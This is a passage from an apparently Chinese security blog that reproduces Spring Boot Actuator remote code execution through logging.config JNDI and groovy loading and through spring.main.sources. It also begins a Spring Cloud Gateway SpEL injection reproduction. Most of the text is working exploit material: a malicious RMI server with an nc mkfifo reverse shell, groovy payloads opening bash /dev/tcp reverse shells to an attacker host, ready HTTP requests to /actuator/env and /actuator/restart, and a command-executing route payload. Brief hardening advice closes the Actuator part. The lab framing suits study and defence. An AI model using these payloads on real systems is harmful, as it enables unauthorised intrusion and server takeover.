<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<p>在根目录放置以 <code>xml</code> 结尾的  <code>example.xml</code> 文件，实际内容要根据步骤二中使用的 JNDI 服务来确定：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">&quot;rmi://your-vps-ip:1389/jndi&quot;</span> <span class="attr">as</span>=<span class="string">&quot;appName&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>步骤二：托管RMI服务及代码</strong></p>
<p>编写优化过后的用来反弹 shell 的JAVA代码(只需修改代码中的服务监听端口和反弹shell的ip地址及其端口)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.rmi.registry.*;</span><br><span class="line">import com.sun.jndi.rmi.registry.*;</span><br><span class="line">import javax.naming.*;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line">public class EvilRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Creating evil RMI registry on port xxxxx&quot;);//RMI服务监听地址</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1097);</span><br><span class="line"> </span><br><span class="line">        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span><br><span class="line">        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        //redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span><br><span class="line">        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="line">        //expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span><br><span class="line">        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc xxx.xxx.xxx.xxx xxxx &gt;/tmp/f&#x27;]).start()\&quot;)&quot;));</span><br><span class="line">         //反弹shell地址为xxx.xxx.xxx.xxx(ip地址)，端口为xxxx(端口地址)</span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;jndi&quot;, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>将上面反弹shell的JAVA代码进行打包成jar包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn clean install</span><br><span class="line">或者</span><br><span class="line">javac xxxxxxx.java</span><br><span class="line">jar -cvf  xxxx.jar -C src/ .</span><br></pre></td></tr></table></figure>



<p><strong>步骤三:  启动RMI服务</strong></p>
<p>指定开启连接RMI服务的主机IP地址，架设RMI服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=xxx.xxx.xxx.xxx -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>



<p><strong>步骤三：设置 logging.config 属性</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">logging.config=http://your-vps-ip/example.xml</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.xml&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤四：重启应用</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="利用实例-9"><a href="#利用实例-9" class="headerlink" title="利用实例"></a>利用实例</h5><p>编写example.xml文档，访问192.168.233.242的RMI服务，放置在开启WEB服务的根目录下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">&lt;insertFromJNDI env-entry-name=&quot;rmi://192.168.233.242:8090/jndi&quot; as=&quot;appName&quot;/&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>



<p>然后使用python开启个简单的http服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2  SimpleHTTPServer  -m 80</span><br></pre></td></tr></table></figure>



<p>编写恶意RMI服务的反弹shell的JAVA代码,当用户访问该RMI服务时会导致使用nc连接到攻击者的主机，实现反向shell连接</p>
<p>代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.rmi.registry.*;</span><br><span class="line">import com.sun.jndi.rmi.registry.*;</span><br><span class="line">import javax.naming.*;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line">public class EvilRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Creating evil RMI registry on port 8090&quot;);//RMI服务监听地址为8090</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1097);</span><br><span class="line"> </span><br><span class="line">        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span><br><span class="line">        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        //redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span><br><span class="line">        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="line">        //expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span><br><span class="line">        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.233.242 1234 &gt;/tmp/f&#x27;]).start()\&quot;)&quot;));</span><br><span class="line">         </span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;jndi&quot;, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>将该代码进行maven打包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn install</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210830204556955.png" class title="image-20210830204556955">



<p>然后指定访问ip地址开启RMI服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=192.168.233.242 -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210830204855751.png" class title="image-20210830204855751">



<p>使用nc监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>



<p>POST方式构造请求包对&#x2F;actuator&#x2F;env发出请求，设置logging.config为前面example.xml的请求地址</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210831165413164.png" class title="image-20210831165413164">



<p>然后再访问&#x2F;actuator&#x2F;restart端点重新启动项目加载变量</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210831165556609.png" class title="image-20210831165556609">



<p>此时就会看到连接shell成功</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210831165644535.png" class title="image-20210831165644535">



<h5 id="利用原理-9"><a href="#利用原理-9" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
<li>目标机器通过 logging.config 属性设置 logback日志配置文件 URL 地址</li>
<li>restart 重启应用后，程序会请求 URL 地址获得恶意 xml 文件内容</li>
<li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li>
<li>xml 文件中利用 <code>logback</code> 依赖的 <code>insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li>
<li>目标机器请求恶意  JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li>
</ul>
<h4 id="2-11-restart-logging-config-groovy-RCE"><a href="#2-11-restart-logging-config-groovy-RCE" class="headerlink" title="2.11. restart logging.config groovy RCE"></a>2.11. restart logging.config groovy RCE</h4><h5 id="利用条件-13"><a href="#利用条件-13" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li>
<li>⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</li>
<li>⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出</li>
</ul>
<h5 id="利用方法-12"><a href="#利用方法-12" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：托管 groovy 文件</strong></p>
<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<p>在根目录放置以 <code>groovy</code> 结尾的  <code>example.groovy</code> 文件，内容为需要执行的 groovy 代码，比如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;执行代码&quot;)</span><br></pre></td></tr></table></figure>



<p><strong>步骤二：设置 spring.main.sources 属性</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">logging.config=http://your-vps-ip/example.groovy</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤三：重启应用</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h5 id="利用实例-10"><a href="#利用实例-10" class="headerlink" title="利用实例"></a>利用实例</h5><p>编写groovy文件并将其放在http服务根目录下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; /dev/tcp/192.168.233.242/1234 0&gt;&amp;1&quot;)</span><br></pre></td></tr></table></figure>



<p>使用python开启http服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2  -m  SimpleHTTPServer  80</span><br></pre></td></tr></table></figure>



<p>以POST的方式向&#x2F;actuator&#x2F;env请求，设置logging.config为groovy的url地址</p>
<p>请求报文如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9098</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 83</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http://192.168.233.242:8080/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210831181920688.png" class title="image-20210831181920688">



<p>在攻击主机上监听1234端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>



<p>然后向&#x2F;actuator&#x2F;restart请求重启项目</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210831180134395.png" class title="image-20210831180134395">



<p>可以看到目标主机反向连接成功</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210831180922722.png" class title="image-20210831180922722">







<h5 id="利用原理-10"><a href="#利用原理-10" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
<li><p>目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址</p>
</li>
<li><p>restart 重启应用后，程序会请求设置的 URL 地址</p>
</li>
<li><p>logback-classic<code>组件的</code>ch.qos.logback.classic.util.ContextInitializer.java<code>代码文件逻辑中会判断 url 是否以</code>groovy&#96; 结尾</p>
</li>
<li><p>如果 url 以 <code>groovy</code> 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞</p>
</li>
</ul>
<h4 id="2-12-restart-spring-main-sources-groovy-RCE"><a href="#2-12-restart-spring-main-sources-groovy-RCE" class="headerlink" title="2.12. restart spring.main.sources groovy RCE"></a>2.12. restart spring.main.sources groovy RCE</h4><h5 id="利用条件-14"><a href="#利用条件-14" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li>
<li>⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</li>
<li>⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出</li>
</ul>
<h5 id="利用方法-13"><a href="#利用方法-13" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：托管 groovy 文件</strong></p>
<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<p>在根目录放置以 <code>groovy</code> 结尾的  <code>example.groovy</code> 文件，内容为需要执行的 groovy 代码，比如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;执行代码&quot;)</span><br></pre></td></tr></table></figure>



<p><strong>步骤二：设置 spring.main.sources 属性</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.main.sources=http://your-vps-ip/example.groovy</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.main.sources&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤三：重启应用</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="利用实例-11"><a href="#利用实例-11" class="headerlink" title="利用实例"></a>利用实例</h5><p>编写groovy文件并将其放在http服务根目录下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; /dev/tcp/192.168.233.242/1234 0&gt;&amp;1&quot;)</span><br></pre></td></tr></table></figure>



<p>使用python开启http服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2  -m  SimpleHTTPServer  80</span><br></pre></td></tr></table></figure>



<p>以POST的方式向&#x2F;actuator&#x2F;env请求，设置spring.main.sources为groovy的url地址</p>
<p>请求报文如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9098</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 83</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.main.sources&quot;,&quot;value&quot;:&quot;http://192.168.233.242:8080/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210831175940842.png" class title="image-20210831175940842">



<p>在攻击主机上监听1234端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>



<p>然后向&#x2F;actuator&#x2F;restart请求重启项目</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210831180134395.png" class title="image-20210831180134395">



<p>可以看到目标主机反向连接成功</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210831180922722.png" class title="image-20210831180922722">



<h5 id="利用原理-11"><a href="#利用原理-11" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
<li>目标机器可以通过 spring.main.sources 属性来设置创建 ApplicationContext 的额外源的 URL 地址</li>
<li>restart 重启应用后，程序会请求设置的 URL 地址</li>
<li>spring-boot<code>组件中的</code>org.springframework.boot.BeanDefinitionLoader.java<code>文件代码逻辑中会判断 url 是否以</code>.groovy&#96; 结尾</li>
<li>如果 url 以 <code>.groovy</code> 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞</li>
</ul>
<h1 id="3-安全措施"><a href="#3-安全措施" class="headerlink" title="3.安全措施"></a>3.安全措施</h1><h3 id="3-1开启security依赖功能"><a href="#3-1开启security依赖功能" class="headerlink" title="3.1开启security依赖功能"></a><strong>3.1开启security依赖功能</strong></h3><p>在项目的pom.xml文件下引入spring-boot-starter-security依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;groupId&gt;org.springframework.boot\&lt;/groupId&gt;</span><br><span class="line"></span><br><span class="line">&lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;</span><br><span class="line"></span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/b01ec604e001e1de3f668bcd86398f62.png" class>

<p>然后在application.properties中开启security功能，配置访问账号密码，重启应用即可弹出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">management.security.enabled=true</span><br><span class="line"></span><br><span class="line">security.user.name=admin</span><br><span class="line"></span><br><span class="line">security.user.password=admin</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/808449fe71e832550f82817c0ae5b3a4.png" class>

<h3 id="3-2禁用接口"><a href="#3-2禁用接口" class="headerlink" title="3.2禁用接口"></a><strong>3.2</strong>禁用接口</h3><p>如果上述请求接口不做任何安全限制，安全隐患显而易见。实际上Spring<br>Boot也提供了安全限制功能。比如要禁用&#x2F;env接口，则可设置如下：</p>
<p>endpoints.env.enabled&#x3D; false</p>
<p>如果只想打开一两个接口，那就先禁用全部接口，然后启用需要的接口：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">endpoints.enabled = false</span><br><span class="line"></span><br><span class="line">endpoints.metrics.enabled = true</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>开发框架漏洞</category>
        <category>Spring</category>
      </categories>
      <tags>
        <tag>-web漏洞 -java开发框架</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring-Cloud-Gateway远程代码执行漏洞复现</title>
    <url>/2022/03/04/Spring-Cloud-Gateway%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="Spring-Cloud-Gateway远程代码执行漏洞复现"><a href="#Spring-Cloud-Gateway远程代码执行漏洞复现" class="headerlink" title="Spring-Cloud-Gateway远程代码执行漏洞复现"></a>Spring-Cloud-Gateway远程代码执行漏洞复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Spring Cloud Gateway 是基于 Spring Framework 和 Spring Boot 构建的 API 网关，它旨在为微服务架构提供一种简单、有效、统一的 API 路由管理方式。<br>据公告描述，当启用和暴露 Gateway Actuator 端点时，使用 Spring Cloud Gateway 的应用程序可受到代码注入攻击。攻击者可以发送特制的恶意请求，从而远程执行任意代码。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.1.0</span><br><span class="line">3.0.0至3.0.6</span><br><span class="line">3.0.0之前的版本</span><br></pre></td></tr></table></figure>



<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>靶场搭建可以使用vulhub进行漏洞复现，vulhub上针对该漏洞已经进行更新，还可以通过其他靶场环境进行漏洞复现。这里使用Vulfocus靶场环境进行复现。</p>
<h3 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h3><p><a href="http://vulfocus.io/#/dashboard?image_id=711335fd-33d8-4a68-b5aa-235d30ded5e2">http://vulfocus.io/#/dashboard?image_id=711335fd-33d8-4a68-b5aa-235d30ded5e2</a></p>
<p>如下图；</p>
<img src="/2022/03/04/Spring-Cloud-Gateway%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220304113236144.png" class title="image-20220304113236144">



<p>访问映射端口</p>
<img src="/2022/03/04/Spring-Cloud-Gateway%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220304135228182.png" class title="image-20220304135228182">



<h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><p>访问端口actuator，可以看到返回spring中存在可访问的端点，可发现存在gateway端点</p>
<img src="/2022/03/04/Spring-Cloud-Gateway%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220304135612461.png" class title="image-20220304135612461">



<p>下面对漏洞点&#x2F;actuator&#x2F;gateway&#x2F;routes&#x2F;EchoSec添加恶意的路由</p>
<p>payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;id&quot;: &quot;EchoSec&quot;,</span><br><span class="line">  &quot;filters&quot;: [&#123;</span><br><span class="line">    &quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">    &quot;args&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;Result&quot;,</span><br><span class="line">      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span><br><span class="line">      //id为需要执行的命令，可设置其他命令执行</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  &quot;uri&quot;: &quot;http://example.com&quot;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<img src="/2022/03/04/Spring-Cloud-Gateway%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220304141850303.png" class title="image-20220304141850303">



<p>然后请求reflesh刷新配置</p>
